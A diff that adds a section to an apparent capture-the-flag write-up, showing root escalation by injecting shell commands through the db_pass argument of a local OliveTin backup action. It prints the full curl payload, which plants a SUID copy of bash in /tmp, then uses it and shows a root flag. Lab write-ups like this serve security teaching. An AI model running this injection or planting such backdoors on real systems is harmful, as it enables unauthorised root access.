@@ -2830,7 +2830,116 @@ The injected `<command>` executes in the middle — as root — because OliveT
 <br>
 </div>
 
-### 5.5 
+### 5.5 Exploiting OliveTin for Root Access
+
+With the vulnerable `backup_database` action identified and the injection point confirmed, the exploit is delivered directly through OliveTin's internal API.
+
+**Command:**
+
+```shell
+curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait" \
+  -H "Content-Type: application/json" \
+  -d '{"actionId": "backup_database", "arguments": [{"name": "db_user", "value": "backup_svc"}, {"name": "db_pass", "value": "x\u0027 ; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash ; #"}, {"name": "db_name", "value": "production"}]}'
+```
+
+**Breakdown:**
+
+- `-s`
+    - **Description:** Silent mode — suppresses progress meters and error output.
+    - **Purpose:** Keeps the terminal output clean, showing only the JSON response.
+- `-X POST`
+    - **Description:** Forces the HTTP method to POST.
+    - **Purpose:** OliveTin's API requires a POST request to trigger an action.
+- `http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait`
+    - **Description:** OliveTin's gRPC-gateway REST endpoint for synchronously executing a predefined action and waiting for it to finish before returning the result.
+    - **Purpose:** This specific endpoint path was confirmed from OliveTin's source and embedded binary strings. The `StartActionAndWait` variant is used over `StartAction` because it holds the connection open until the command completes, returning the full output — crucial for confirming the injection succeeded.
+- `-H "Content-Type: application/json"`
+    - **Description:** Sets the request Content-Type header to JSON.
+    - **Purpose:** Required for OliveTin's API to parse the request body correctly.
+- `"actionId": "backup_database"`
+    - **Description:** Specifies which configured OliveTin action to execute by its `id` field from `config.yaml`.
+    - **Purpose:** Targets the specific `backup_database` action whose shell template contains the vulnerable `db_pass` interpolation.
+- `"name": "db_pass", "value": "x\u0027 ; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash ; #"`
+    - **Description:** The injection payload supplied as the `db_pass` argument value. `\u0027` is the JSON Unicode escape for a single quote `'`.
+    - **Purpose:** The `x` is a placeholder to satisfy the password field. The `\u0027` closes the single-quoted string in the shell command (`-p'x'`), the `;` terminates the `mysqldump` call entirely, and the injected commands run in its place. The `#` at the end comments out the remainder of the original shell command so nothing after the injection causes a syntax error.
+- `"db_user"` / `"db_name"`
+    - **Description:** Benign placeholder values for the other two template arguments.
+    - **Purpose:** Required to satisfy OliveTin's argument validation — their values are irrelevant to the exploit.
+
+**How the injection works step by step:**
+
+OliveTin takes your input and builds this shell command:
+
+```
+mysqldump -u backup_svc -p'x' ; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash ; #' production > /opt/backups/backup.sql
+```
+
+Breaking that down:
+
+1. `mysqldump -u backup_svc -p'x'` — runs and fails (wrong password, wrong db — irrelevant)
+2. `;` — ends that command regardless of its exit code
+3. `cp /bin/bash /tmp/rootbash` — copies bash to `/tmp` as root
+4. `chmod 4755 /tmp/rootbash` — sets the SUID bit, making it run as root for anyone
+5. `#` — comments out `' production > /opt/backups/backup.sql` so the remaining original syntax doesn't cause an error
+
+Since OliveTin runs as root, every command in that chain executes as root.
+
+**Result:**
+
+```
+{"logEntry":{"actionTitle":"Backup Database", "exitCode":0, "user":"guest", "executionFinished":true, ...}}
+```
+
+The action completed successfully. The `exitCode: 0` and `executionFinished: true` confirm the injected commands ran.
+
+---
+
+**Command:** `ls -la /tmp/rootbash`
+
+**Breakdown:**
+
+- `-la`
+    - **Description:** Lists files in long format (`-l`) including hidden files (`-a`).
+    - **Purpose:** Verifies that `/tmp/rootbash` was created and — critically — that it carries the SUID bit (`s` in the permissions column), confirming the injection worked correctly.
+
+**Result:**
+
+```
+-rwsr-xr-x 1 root root 1446024 Jul  1 12:55 /tmp/rootbash
+```
+
+The `s` in place of the execute bit (`x`) in `rws` confirms the SUID bit is set. The file is owned by root. Anyone who executes this binary gets root's effective UID.
+
+---
+
+**Command:** `/tmp/rootbash -p`
+
+**Breakdown:**
+
+- `/tmp/rootbash`
+    - **Description:** The SUID copy of `/bin/bash` created by the injection.
+    - **Purpose:** Executes as root due to the SUID bit — running it drops us into a bash session with root's effective user ID.
+- `-p`
+    - **Description:** Tells bash to run in privileged mode, preserving the effective UID set by the SUID bit.
+    - **Purpose:** Without `-p`, bash detects the mismatch between the real UID (`haris`) and the effective UID (`root`) and silently drops privileges as a safety measure. The `-p` flag overrides this behavior and retains root access.
+
+**Result:**
+
+```
+uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
+```
+
+`euid=0(root)` confirms we are executing as root. The real UID remains `haris` — we haven't changed who we are on the system, only whose privileges we are running with.
+
+---
+
+**Command:** `cat /root/root.txt`
+
+**Result:**
+
+```
+a2777bed36a89cd11352d77374e39b16
+```
 <div align="center">
 <br>
 <br>
